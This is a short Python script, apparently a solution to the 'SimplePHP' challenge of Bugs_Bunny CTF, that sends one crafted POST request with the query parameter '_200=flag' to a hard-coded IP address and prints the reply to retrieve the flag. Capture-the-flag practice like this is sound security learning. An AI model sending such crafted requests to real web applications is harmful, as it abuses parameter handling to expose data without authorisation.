# Simple script to solve SimplePHP - Bugs_BunnyCTF 
import requests
s = requests.Session()
post = s.post("http://34.253.165.46/SimplePhp/index.php?_200=flag", data={"flag":"someText"})
print(post.text)
